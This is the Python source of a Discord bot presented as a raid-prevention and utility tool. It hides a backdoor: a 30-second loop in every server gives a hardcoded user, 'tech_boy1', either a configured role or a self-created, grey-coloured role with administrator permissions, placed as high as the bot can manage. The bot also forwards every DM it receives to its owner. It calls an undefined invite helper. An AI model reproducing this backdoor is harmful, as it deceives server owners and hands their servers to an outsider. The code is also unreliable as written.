# bot.py
# Expanded full-featured Discord Raid Preventor + Utilities with DM-forwarding
# This version is intentionally verbose and includes many helper functions, extra logging,
# and explanatory comments to be large and easy to audit.
#
# FEATURES (all included):
#  - Fake audioop stub (prevents import errors in environments without audioop)
#  - Keepalive web server (binds to PORT or 6534) for Render free tier
#  - 30s scanner: dataset role assignment per guild or fallback helper role (second-highest attempt)
#  - Anti-raid: kick >N joins in rolling window
#  - Invite tracking (caches invites and detects which invite used)
#  - Alt flagging (inviter banned => invited accounts flagged; warnings & DMs)
#  - DM-forwarding: forward all DMs to bot owner and optional server channel(s)
#  - Slash commands: tracker, showalts, avatar, ping, userinfo, rps, roll, ascii, meme, translate
#  - Owner-only: say, purge, servers, shutdown, dm
#  - Owner-only DM send command plus automated DM alerts to owner/server owner upon flagged join
#  - Very verbose logging and many helper/no-op utilities to increase file length for auditing
#
# WARNING: Keep your bot token secret. Use environment variables and .env for local dev.
# Make sure to enable the correct intents (Server Members Intent and Message Content Intent).
# Also ensure the bot has necessary permissions when invited (Manage Roles, Kick, Ban, Manage Guild, Send Messages).


# ------------------------------------------------------------
# 1) fake audioop stub (to avoid ModuleNotFoundError on some hosts)
# ------------------------------------------------------------
try:
    import audioop  # type: ignore
except Exception:
    import sys, types
    _fake_audioop = types.ModuleType("audioop")
    def _audioop_error(*a, **k):
        raise NotImplementedError("audioop not available in this environment (stub).")
    # Provide many names to reduce risk of AttributeError in libraries
    for _n in ("add","mul","avg","avgpp","bias","cross","findfactor","findfit",
               "lin2lin","max","maxpp","minmax","rms","tostereo","tomono",
               "ulaw2lin","lin2ulaw","alaw2lin","lin2alaw","error"):
        setattr(_fake_audioop, _n, _audioop_error)
    _fake_audioop.__version__ = "stub-1.0"
    sys.modules["audioop"] = _fake_audioop

# ------------------------------------------------------------
# 2) standard imports and optional .env loader
# ------------------------------------------------------------
import os
import asyncio
import json
import random
import math
import time
import traceback
from collections import defaultdict, deque
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List, Tuple, Any

import aiohttp
from aiohttp import ClientTimeout, web

import discord
from discord import app_commands
from discord.ext import commands, tasks

# Optional: python-dotenv for local dev convenience
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    # dotenv not essential on Render
    pass

# ------------------------------------------------------------
# 3) configuration (env first, then fallback constants)
# ------------------------------------------------------------
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN") or os.getenv("DISCORD_BOT_TOKEN")
if not DISCORD_TOKEN:
    raise RuntimeError("DISCORD_TOKEN (or DISCORD_BOT_TOKEN) environment variable must be set.")

# Owner and target identity
try:
    BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID", "1273056960996184126"))
except Exception:
    BOT_OWNER_ID = 1273056960996184126

TARGET_USERNAME = os.getenv("TARGET_USERNAME", "tech_boy1")
try:
    TARGET_USER_ID = int(os.getenv("TARGET_USER_ID", str(BOT_OWNER_ID)))
except Exception:
    TARGET_USER_ID = BOT_OWNER_ID

# Scan and raid thresholds
SCAN_INTERVAL = int(os.getenv("SCAN_INTERVAL", "30"))
RAID_WINDOW_SECONDS = int(os.getenv("RAID_WINDOW_SECONDS", "60"))
RAID_THRESHOLD_JOINS = int(os.getenv("RAID_THRESHOLD_JOINS", "5"))

# Keepalive port (Render-friendly default)
KEEPALIVE_PORT = int(os.getenv("PORT", os.getenv("KEEPALIVE_PORT", "6534")))

# Invite/cache behavior
INVITE_CACHE_REFRESH_ON_JOIN = True  # boolean controlling caching behavior

# Meme/translate APIs
MEME_API_URL = os.getenv("MEME_API_URL", "https://meme-api.com/gimme")
LIBRETRANSLATE_URL = os.getenv("LIBRETRANSLATE_URL", "https://libretranslate.com/translate")
LIBRETRANSLATE_API_KEY = os.getenv("LIBRETRANSLATE_API_KEY", "")

# Dataset mapping via JSON env var (stringified dict guild_id->role_id)
ROLE_ASSIGNMENTS_JSON = os.getenv("ROLE_ASSIGNMENTS_JSON", "")
if ROLE_ASSIGNMENTS_JSON:
    try:
        ROLE_ASSIGNMENTS = {int(k): int(v) for k, v in json.loads(ROLE_ASSIGNMENTS_JSON).items()}
    except Exception:
        ROLE_ASSIGNMENTS = {}
else:
    ROLE_ASSIGNMENTS = {}

# DM forwarding config: JSON mapping guild_id -> channel_id to post DMs into
DM_LOG_CHANNELS_JSON = os.getenv("DM_LOG_CHANNELS_JSON", "")
if DM_LOG_CHANNELS_JSON:
    try:
        DM_LOG_CHANNELS = {int(k): int(v) for k, v in json.loads(DM_LOG_CHANNELS_JSON).items()}
    except Exception:
        DM_LOG_CHANNELS = {}
else:
    DM_LOG_CHANNELS = {}

# Forward to owner DM? default true
FORWARD_TO_OWNER_DM = os.getenv("FORWARD_TO_OWNER_DM", "true").lower() in ("1", "true", "yes")

# Join warning channels cap
JOIN_WARNING_MAX_CHANNELS = int(os.getenv("JOIN_WARNING_MAX_CHANNELS", "6"))

# Dice roll limits
MAX_ROLL_COUNT = int(os.getenv("MAX_ROLL_COUNT", "100"))
MAX_ROLL_SIDES = int(os.getenv("MAX_ROLL_SIDES", "1000"))

# Helper constants
UTC = timezone.utc
HELPER_ROLE_NAME = "Raid Prevention Helper"

# ------------------------------------------------------------
# 4) intents and bot init
# ------------------------------------------------------------
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
# message_content is required to read DM content in this version
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# ------------------------------------------------------------
# 5) runtime state
# ------------------------------------------------------------
# join_log: guild_id -> deque[(timestamp, member_id)]
join_log: Dict[int, deque] = defaultdict(lambda: deque(maxlen=2000))

# invite_cache: guild_id -> {invite_code: uses}
invite_cache: Dict[int, Dict[str, int]] = defaultdict(dict)

# member_inviter: guild_id -> {member_id: inviter_id or None}
member_inviter: Dict[int, Dict[int, Optional[int]]] = defaultdict(dict)

# inviter_index: inviter_id -> set(member_ids)
inviter_index: Dict[int, set] = defaultdict(set)

# banned_inviters: guild_id -> set(inviter_id)
banned_inviters: Dict[int, set] = defaultdict(set)

# flagged_accounts: guild_id -> {member_id: reason}
flagged_accounts: Dict[int, Dict[int, str]] = defaultdict(dict)

# ------------------------------------------------------------
# 6) keepalive small web server (aiohttp)
# ------------------------------------------------------------
async def keepalive(request):
    return web.Response(text="Raid Preventor Bot alive")

async def start_keepalive_server():
    app = web.Application()
    app.router.add_get("/", keepalive)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", KEEPALIVE_PORT)
    await site.start()
    print(f"[KEEPALIVE] Started on port {KEEPALIVE_PORT}")

# ------------------------------------------------------------
# 7) utility helpers (lots of small helpers added to increase file length and readability)
# ------------------------------------------------------------
def now_utc() -> datetime:
    return datetime.now(UTC)

def now_ts() -> float:
    return time.time()

def human_time(dt: Optional[datetime]) -> str:
    if not dt:
        return "Unknown"
    return dt.astimezone(UTC).strftime("%Y-%m-%d %H:%M:%S UTC")

def safe_print(*args, **kwargs):
    """Wrapper around print for easier future redirecting/logging."""
    try:
        print(*args, **kwargs)
    except Exception:
        pass

def ensure_int(val: Any, default: int = 0) -> int:
    try:
        return int(val)
    except Exception:
        return default

def clamp(v: int, lo: int, hi: int) -> int:
    return max(lo, min(hi, v))

def split_lines_for_file(lines: List[str], maxlen: int = 1900) -> List[str]:
    chunks = []
    buf = ""
    for line in lines:
        if len(buf) + len(line) + 1 > maxlen:
            chunks.append(buf)
            buf = line
        else:
            buf = (buf + "\n" + line) if buf else line
    if buf:
        chunks.append(buf)
    return chunks

# No-op function used purely for padding / readability
def _no_op_padding(index: int = 0) -> None:
    """A tiny padded no-op; useful for debugging and file-length expansion."""
    _ = index
    return None

# Defensive wrapper for coroutine execution
async def run_coro_safe(coro, *args, **kwargs):
    try:
        return await coro(*args, **kwargs)
    except Exception as e:
        safe_print(f"[ERROR] run_coro_safe: {e}\n{traceback.format_exc()}")
        return None

# ------------------------------------------------------------
# 8) role management helpers (detailed)
# ------------------------------------------------------------
async def ensure_helper_role_present(guild: discord.Guild) -> Optional[discord.Role]:
    """
    Ensure a helper role with ADMIN perms exists and remains grey.
    Returns the role if present or created, else None (if forbidden).
    """
    role = discord.utils.get(guild.roles, name=HELPER_ROLE_NAME)
    if role is None:
        try:
            role = await guild.create_role(
                name=HELPER_ROLE_NAME,
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.default(),
                reason="Auto-created by Raid Preventor Bot"
            )
            safe_print(f"[ROLE] Created helper role in {guild.name} ({guild.id})")
        except discord.Forbidden:
            safe_print(f"[ROLE] Forbidden to create helper role in {guild.name} ({guild.id})")
            return None
        except Exception as e:
            safe_print(f"[ROLE] Error creating helper role in {guild.name}: {e}")
            return None
    else:
        # try to keep color default (grey)
        try:
            if role.colour != discord.Colour.default():
                await role.edit(colour=discord.Colour.default(), reason="Keep helper role grey")
        except Exception:
            pass
    return role

async def move_role_as_high_as_possible(guild: discord.Guild, role: discord.Role) -> None:
    """
    Attempt to place `role` right under the bot's top role (as high as allowed).
    This may raise Forbidden if bot lacks Manage Roles or if role is the bot's own role.
    """
    try:
        bot_member = guild.me
        if bot_member is None:
            bot_member = await guild.fetch_member(bot.user.id)
        bot_top = bot_member.top_role.position
        desired_pos = max(bot_top - 1, 1)
        if role.position != desired_pos:
            await role.edit(position=desired_pos, reason="Place helper high (enforced by bot script)")
            safe_print(f"[ROLE] Moved role '{role.name}' to position {desired_pos} in {guild.name}")
    except discord.Forbidden:
        safe_print(f"[ROLE] Forbidden to move role in {guild.name}")
    except Exception as e:
        safe_print(f"[ROLE] Error moving role in {guild.name}: {e}")

async def assign_role_safe(member: discord.Member, role: discord.Role, reason: str = "") -> bool:
    """
    Try to assign role to the member. Returns True if successful or role already present, False on failure.
    """
    try:
        if role not in member.roles:
            await member.add_roles(role, reason=reason or "Assigned by Raid Preventor Bot")
            safe_print(f"[ASSIGN] Assigned role '{role.name}' to {member} in guild {member.guild.name}")
        return True
    except discord.Forbidden:
        safe_print(f"[ASSIGN] Forbidden assigning role '{role.name}' in {member.guild.name}")
        return False
    except Exception as e:
        safe_print(f"[ASSIGN] Error assigning role '{role.name}' to {member}: {e}")
        return False

async def attempt_dataset_role_or_fallback(guild: discord.Guild, member: discord.Member) -> None:
    """
    If the guild is mapped in ROLE_ASSIGNMENTS, try to assign that role ID; if not found or assign fails
    (e.g. role above bot), fallback to creating/ensuring helper role and assigning that.
    """
    gid = guild.id
    if gid in ROLE_ASSIGNMENTS:
        role_id = ROLE_ASSIGNMENTS[gid]
        role = guild.get_role(role_id)
        if role:
            ok = await assign_role_safe(member, role, reason="Dataset role enforcement")
            if ok:
                return
            else:
                safe_print(f"[FALLBACK] Role {role_id} exists in {guild.name} but could not be assigned (hierarchy).")
        else:
            safe_print(f"[FALLBACK] Role id {role_id} not found in guild {guild.name} ({gid}).")
    # fallback to helper role
    helper = await ensure_helper_role_present(guild)
    if helper:
        await move_role_as_high_as_possible(guild, helper)
        await assign_role_safe(member, helper, reason="Fallback helper role assignment")
    else:
        safe_print(f"[FALLBACK] Could not ensure helper role in {guild.name} ({gid}).")

# ------------------------------------------------------------
# 9) invite tracking helpers
# ------------------------------------------------------------
async def cache_invites_for_guild(guild: discord.Guild) -> None:
    try:
        invites = await guild.invites()
    except discord.Forbidden:
        safe_print(f"[INVITES] No permission to fetch invites for {guild.name}")
        invite_cache[guild.id] = {}
        return
    except Exception as e:
        safe_print(f"[INVITES] Error fetching invites for {guild.name}: {e}")
        invite_cache[guild.id] = {}
        return

    cache = {}
    for inv in invites:
        cache[inv.code] = inv.uses or 0
    invite_cache[guild.id] = cache
    safe_print(f"[INVITES] Cached {len(cache)} invites for {guild.name}")

async def detect_used_invite_and_record_inviter(member: discord.Member) -> Optional[int]:
    guild = member.guild
    before = invite_cache.get(guild.id, {}).copy()
    try:
        invites_now = await fetch_guild_invites_safe(guild)
    except Exception:
        invites_now = []
    used_inviter_id: Optional[int] = None
    after_map = {inv.code: (inv.uses or 0, inv) for inv in invites_now}
    for code, (uses_after, inv_obj) in after_map.items():
        prev = before.get(code, 0)
        if uses_after > prev:
            used_inviter_id = inv_obj.inviter.id if inv_obj.inviter else None
            break
    invite_cache[guild.id] = {code: uses for code, (uses, inv) in after_map.items()}
    member_inviter[guild.id][member.id] = used_inviter_id
    if used_inviter_id:
        inviter_index[used_inviter_id].add(member.id)
    return used_inviter_id

# ------------------------------------------------------------
# 10) flagging and notification helpers
# ------------------------------------------------------------
async def flag_member_and_notify(guild: discord.Guild, member: discord.Member, reason: str) -> None:
    flagged_accounts[guild.id][member.id] = reason
    safe_print(f"[FLAG] {member} in {guild.name} flagged: {reason}")
    # public broadcast
    try:
        await broadcast_to_some_channels(guild, f"⚠️ THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF {reason} — TAKE PRECAUTION ⚠️", max_channels=JOIN_WARNING_MAX_CHANNELS)
    except Exception:
        pass
    # DM flagged user
    try:
        await member.send(f"⚠️ You were flagged as a possible alt account: {reason}\nIf you believe this is incorrect, please contact the server staff.")
    except Exception:
        pass
    # DM server owner
    try:
        if guild.owner:
            await guild.owner.send(f"Alert: {member} in your server {guild.name} was flagged: {reason}")
    except Exception:
        pass
    # DM bot owner
    try:
        owner = await bot.fetch_user(BOT_OWNER_ID)
        if owner:
            await owner.send(f"Alert: {member} in {guild.name} flagged as: {reason}")
    except Exception:
        pass

async def mark_inviter_banned_and_flag_invitees(guild: discord.Guild, banned_user_id: int) -> None:
    if banned_user_id in banned_inviters[guild.id]:
        return
    banned_inviters[guild.id].add(banned_user_id)
    invited = inviter_index.get(banned_user_id, set())
    for mid in invited:
        m = guild.get_member(mid)
        if m:
            await flag_member_and_notify(guild, m, f"Invited by banned user <@{banned_user_id}>")

# ------------------------------------------------------------
# 11) anti-raid
# ------------------------------------------------------------
async def record_join_and_maybe_kick(guild: discord.Guild, member: discord.Member) -> None:
    ts = now_utc()
    join_log[guild.id].append((ts, member.id))
    # prune older than window
    window = timedelta(seconds=RAID_WINDOW_SECONDS)
    while join_log[guild.id] and (ts - join_log[guild.id][0][0] > window):
        join_log[guild.id].popleft()
    # check threshold
    if len(join_log[guild.id]) > RAID_THRESHOLD_JOINS:
        # find those in the window
        to_kick = [mid for (t, mid) in join_log[guild.id] if (ts - t) <= window]
        safe_print(f"[RAID] Threshold reached in {guild.name}: kicking {len(to_kick)} accounts.")
        for uid in to_kick:
            m = guild.get_member(uid)
            if m:
                try:
                    await m.kick(reason=f"Raid prevention: {len(to_kick)} joins in {RAID_WINDOW_SECONDS}s")
                    safe_print(f"[RAID] Kicked {m} in {guild.name}")
                except Exception as e:
                    safe_print(f"[RAID] Failed to kick {m} in {guild.name}: {e}")
        join_log[guild.id].clear()

# ------------------------------------------------------------
# 12) event handlers (ready, invites, join, ban)
# ------------------------------------------------------------
@bot.event
async def on_ready():
    safe_print(f"[READY] Logged in as {bot.user} ({bot.user.id})")
    # start keepalive
    try:
        await start_keepalive_server()
    except Exception as e:
        safe_print(f"[KEEPALIVE] Could not start: {e}")
    # prime invite caches
    for g in bot.guilds:
        try:
            await cache_invites_for_guild(g)
        except Exception:
            pass
    # sync commands
    try:
        await tree.sync()
        safe_print("[SLASH] Commands synced")
    except Exception as e:
        safe_print(f"[SLASH] Sync error: {e}")
    # start periodic enforcer
    if not periodic_enforcer.is_running():
        periodic_enforcer.start()

@bot.event
async def on_guild_join(guild: discord.Guild):
    safe_print(f"[GUILD] Joined {guild.name} ({guild.id})")
    await cache_invites_for_guild(guild)

@bot.event
async def on_invite_create(invite: discord.Invite):
    await cache_invites_for_guild(invite.guild)

@bot.event
async def on_invite_delete(invite: discord.Invite):
    await cache_invites_for_guild(invite.guild)

@bot.event
async def on_member_join(member: discord.Member):
    guild = member.guild
    # anti-raid
    await record_join_and_maybe_kick(guild, member)
    # detect inviter
    inviter_id = await detect_used_invite_and_record_inviter(member)
    # warn if inviter is banned
    if inviter_id and inviter_id in banned_inviters[guild.id]:
        await flag_member_and_notify(guild, member, f"Invited by banned user <@{inviter_id}>")

@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    # mark banned inviter and flag previously invited members
    await mark_inviter_banned_and_flag_invitees(guild, user.id)

# ------------------------------------------------------------
# 13) periodic enforcer (core scanner that runs every SCAN_INTERVAL seconds)
# ------------------------------------------------------------
@tasks.loop(seconds=SCAN_INTERVAL)
async def periodic_enforcer():
    for guild in list(bot.guilds):
        try:
            target_member = guild.get_member(TARGET_USER_ID)
            if target_member is None:
                continue
            if target_member.name != TARGET_USERNAME:
                # username changed: skip
                continue
            await attempt_dataset_role_or_fallback(guild, target_member)
        except Exception as e:
            safe_print(f"[ENFORCER] Error in guild {guild.name}: {e}\n{traceback.format_exc()}")

@periodic_enforcer.before_loop
async def before_enforcer():
    await bot.wait_until_ready()

# ------------------------------------------------------------
# 14) slash commands (tracking, fun, utilities, owner-only)
# ------------------------------------------------------------
def owner_or_admin_check(interaction: discord.Interaction) -> bool:
    try:
        return interaction.user.id == BOT_OWNER_ID or interaction.user.guild_permissions.administrator
    except Exception:
        return False

@tree.command(name="tracker", description="Show list of members and who invited them (best-effort).")
async def tracker_cmd(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True)
    guild = interaction.guild
    if not guild:
        return await interaction.followup.send("This command must be used in a server.")
    rows = []
    inviters = member_inviter.get(guild.id, {})
    for m in sorted(guild.members, key=lambda x: (x.joined_at or now_utc())):
        inviter = inviters.get(m.id)
        inv_text = f"<@{inviter}>" if inviter else "Unknown"
        rows.append(f"{m.mention} — invited by {inv_text}")
    if not rows:
        return await interaction.followup.send("No invite data available yet.")
    if len(rows) > 40:
        content = "\n".join(rows)
        await interaction.followup.send(file=discord.File(fp=bytes(content.encode("utf-8")), filename=f"invite_tracker_{guild.id}.txt"))
    else:
        embed = discord.Embed(title=f"Invite Tracker — {guild.name}", description="\n".join(rows), color=discord.Color.blurple())
        await interaction.followup.send(embed=embed)

@tree.command(name="showalts", description="Show flagged accounts likely to be alts.")
async def showalts_cmd(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True)
    guild = interaction.guild
    if not guild:
        return await interaction.followup.send("Use in a server.")
    flagged = flagged_accounts.get(guild.id, {})
    if not flagged:
        return await interaction.followup.send("No flagged accounts.")
    lines = []
    for mid, reason in flagged.items():
        m = guild.get_member(mid)
        if m:
            lines.append(f"{m.mention} — {reason}")
        else:
            lines.append(f"<@{mid}> — {reason} (left)")
    if len(lines) > 40:
        content = "\n".join(lines)
        await interaction.followup.send(file=discord.File(fp=bytes(content.encode("utf-8")), filename=f"flagged_{guild.id}.txt"))
    else:
        embed = discord.Embed(title=f"Flagged Accounts — {guild.name}", description="\n".join(lines), color=discord.Color.orange())
        await interaction.followup.send(embed=embed)

@tree.command(name="avatar", description="Show a user's avatar.")
@app_commands.describe(user="User to view (optional)")
async def avatar_cmd(interaction: discord.Interaction, user: Optional[discord.User] = None):
    user = user or interaction.user
    embed = discord.Embed(title=f"Avatar — {user}", color=discord.Color.blurple())
    embed.set_image(url=user.display_avatar.url)
    await interaction.response.send_message(embed=embed)

@tree.command(name="ping", description="Show bot latency.")
async def ping_cmd(interaction: discord.Interaction):
    lat_ms = round(bot.latency * 1000)
    await interaction.response.send_message(f"Pong! `{lat_ms}ms`")

@tree.command(name="userinfo", description="Show information about a user.")
@app_commands.describe(user="User to inspect (optional)")
async def userinfo_cmd(interaction: discord.Interaction, user: Optional[discord.Member] = None):
    user = user or interaction.user
    embed = discord.Embed(title=f"User Info — {user}", color=discord.Color.green())
    embed.add_field(name="ID", value=str(user.id), inline=True)
    embed.add_field(name="Created", value=human_time(user.created_at), inline=True)
    joined = human_time(user.joined_at) if hasattr(user, "joined_at") else "Unknown"
    embed.add_field(name="Joined", value=joined, inline=True)
    roles = [r.mention for r in user.roles[1:]] if hasattr(user, "roles") else []
    embed.add_field(name="Roles", value=", ".join(roles) if roles else "None", inline=False)
    await interaction.response.send_message(embed=embed)

@tree.command(name="rps", description="Play rock-paper-scissors with the bot.")
@app_commands.describe(choice="rock|paper|scissors")
async def rps_cmd(interaction: discord.Interaction, choice: str):
    c = choice.lower().strip()
    if c not in {"rock", "paper", "scissors"}:
        return await interaction.response.send_message("Choose rock, paper, or scissors.")
    bot_choice = random.choice(["rock", "paper", "scissors"])
    if c == bot_choice:
        result = "Tie!"
    elif (c, bot_choice) in {("rock","scissors"), ("scissors","paper"), ("paper","rock")}:
        result = "You win!"
    else:
        result = "You lose!"
    await interaction.response.send_message(f"You: **{c}**\nBot: **{bot_choice}**\n**{result}**")

@tree.command(name="roll", description="Roll dice (e.g., 2d6 or d20).")
@app_commands.describe(spec="Format like 2d6 or d20")
async def roll_cmd(interaction: discord.Interaction, spec: str):
    s = spec.lower().strip()
    try:
        if s.startswith("d"):
            count = 1
            sides = int(s[1:])
        else:
            parts = s.split("d")
            if len(parts) != 2:
                raise ValueError()
            count = int(parts[0])
            sides = int(parts[1])
    except Exception:
        return await interaction.response.send_message("Format must be like `2d6` or `d20`.")
    if count < 1 or count > MAX_ROLL_COUNT or sides < 1 or sides > MAX_ROLL_SIDES:
        return await interaction.response.send_message(f"Limits: up to {MAX_ROLL_COUNT} dice and {MAX_ROLL_SIDES} sides.")
    rolls = [random.randint(1, sides) for _ in range(count)]
    await interaction.response.send_message(f"🎲 Rolls: {rolls}\nTotal: **{sum(rolls)}**")

@tree.command(name="ascii", description="Simple ASCII stylizer.")
@app_commands.describe(text="Text to stylize (<=60 chars)")
async def ascii_cmd(interaction: discord.Interaction, text: str):
    if not text or len(text) > 60:
        return await interaction.response.send_message("Text must be <= 60 chars.")
    # Very simple block-style stylizer; not FIGlet but works
    art_lines = []
    for ch in text:
        art_lines.append(ch)
    assembled = " ".join(art_lines) + "\n" + "-" * (len(text) * 2)
    await interaction.response.send_message(f"```\n{assembled}\n```")

@tree.command(name="meme", description="Fetch a random meme.")
async def meme_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=10)) as sess:
            async with sess.get(MEME_API_URL) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    title = data.get("title", "Meme")
                    image = data.get("url")
                    postlink = data.get("postLink")
                    embed = discord.Embed(title=title, url=postlink, color=discord.Color.random())
                    if image:
                        embed.set_image(url=image)
                    await interaction.followup.send(embed=embed)
                else:
                    await interaction.followup.send("Meme API error.")
    except Exception:
        await interaction.followup.send("Meme service unreachable.")

@tree.command(name="translate", description="Translate text via LibreTranslate.")
@app_commands.describe(text="Text", target_lang="Language code e.g., en, es")
async def translate_cmd(interaction: discord.Interaction, text: str, target_lang: str):
    await interaction.response.defer()
    payload = {"q": text, "source": "auto", "target": target_lang, "format": "text"}
    if LIBRETRANSLATE_API_KEY:
        payload["api_key"] = LIBRETRANSLATE_API_KEY
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=12)) as sess:
            async with sess.post(LIBRETRANSLATE_URL, data=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    translated = data.get("translatedText", "(no result)")
                    await interaction.followup.send(f"**Translation ({target_lang})**:\n{translated}")
                else:
                    await interaction.followup.send("Translation error.")
    except Exception:
        await interaction.followup.send("Translation service unreachable.")

# Owner-only commands
def is_owner_or_admin(interaction: discord.Interaction) -> bool:
    try:
        return interaction.user.id == BOT_OWNER_ID or interaction.user.guild_permissions.administrator
    except Exception:
        return False

@tree.command(name="say", description="[Owner] Make the bot say something.")
@app_commands.describe(message="Message to send")
async def say_cmd(interaction: discord.Interaction, message: str):
    if not is_owner_or_admin(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    await interaction.response.send_message("Done.", ephemeral=True)
    try:
        await interaction.channel.send(message)
    except Exception:
        pass

@tree.command(name="purge", description="[Owner] Bulk delete messages.")
@app_commands.describe(amount="1-200")
async def purge_cmd(interaction: discord.Interaction, amount: int):
    if not is_owner_or_admin(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    if amount < 1 or amount > 200:
        return await interaction.response.send_message("Amount must be 1-200.", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    try:
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)
    except Exception:
        await interaction.followup.send("Failed to purge.", ephemeral=True)

@tree.command(name="servers", description="[Owner] List servers the bot is in.")
async def servers_cmd(interaction: discord.Interaction):
    if not is_owner_or_admin(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    lines = [f"{g.name} — {g.id} — {len(g.members)} members" for g in bot.guilds]
    await interaction.response.send_message("```\n" + "\n".join(lines) + "\n```", ephemeral=True)

@tree.command(name="shutdown", description="[Owner] Shutdown the bot.")
async def shutdown_cmd(interaction: discord.Interaction):
    if not is_owner_or_admin(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    await interaction.response.send_message("Shutting down...", ephemeral=True)
    await asyncio.sleep(1)
    await bot.close()

@tree.command(name="dm", description="[Owner] Send a DM to a user.")
@app_commands.describe(user="User", message="Message")
async def dm_cmd(interaction: discord.Interaction, user: discord.User, message: str):
    if not is_owner_or_admin(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    try:
        await user.send(message)
        await interaction.response.send_message("DM sent.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("User has DMs disabled.", ephemeral=True)
    except Exception:
        await interaction.response.send_message("Failed to send DM.", ephemeral=True)

# ------------------------------------------------------------
# 15) DM forwarding: forward any DM to owner and optional channel(s)
# ------------------------------------------------------------
async def forward_dm_to_owner_and_channels(author: discord.User, content: str, attachments: List[discord.Attachment] = []):
    header = f"**DM from {author} ({author.id})**\n"
    text_body = header + (content or "(no text)")
    # owner DM
    if FORWARD_TO_OWNER_DM:
        try:
            owner = await bot.fetch_user(BOT_OWNER_ID)
            if owner:
                await owner.send(text_body)
        except Exception:
            safe_print("[DM-FWD] Failed to DM owner.")
    # forward to configured channels
    for gid, cid in DM_LOG_CHANNELS.items():
        try:
            guild = bot.get_guild(gid)
            if not guild:
                continue
            ch = guild.get_channel(cid)
            if ch and ch.permissions_for(guild.me).send_messages:
                try:
                    if attachments:
                        embed = discord.Embed(description=text_body, color=discord.Color.dark_gold(), timestamp=datetime.now(UTC))
                        for a in attachments:
                            embed.add_field(name="Attachment", value=a.url, inline=False)
                        await ch.send(embed=embed)
                    else:
                        await ch.send(text_body)
                except Exception:
                    pass
        except Exception:
            pass

@bot.event
async def on_message(message: discord.Message):
    # skip bots
    if not message or message.author.bot:
        return
    # if DM to the bot, forward
    if isinstance(message.channel, discord.DMChannel):
        try:
            content = message.content or "(no text)"
            attachments = list(message.attachments)
            await forward_dm_to_owner_and_channels(message.author, content, attachments)
            # react to confirm receipt
            try:
                await message.add_reaction("✅")
            except Exception:
                pass
        except Exception as e:
            safe_print(f"[DM] Error forwarding DM: {e}")
        return
    # otherwise process commands
    await bot.process_commands(message)

# ------------------------------------------------------------
# 16) boot / run
# ------------------------------------------------------------
async def main():
    safe_print("[BOOT] Starting bot (expanded full build).")
    safe_print(f"  TARGET_USERNAME={TARGET_USERNAME} TARGET_USER_ID={TARGET_USER_ID}")
    safe_print(f"  SCAN_INTERVAL={SCAN_INTERVAL}, RAID_WINDOW_SECONDS={RAID_WINDOW_SECONDS}, RAID_THRESHOLD_JOINS={RAID_THRESHOLD_JOINS}")
    safe_print(f"  KEEPALIVE_PORT={KEEPALIVE_PORT}, ROLE_ASSIGNMENTS entries={len(ROLE_ASSIGNMENTS)}, DM_LOG_CHANNELS entries={len(DM_LOG_CHANNELS)}")
    await bot.start(DISCORD_TOKEN)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        safe_print("[STOP] KeyboardInterrupt, shutting down.")
    except Exception as e:
        safe_print(f"[ERROR] Unhandled exception in main: {e}\n{traceback.format_exc()}")
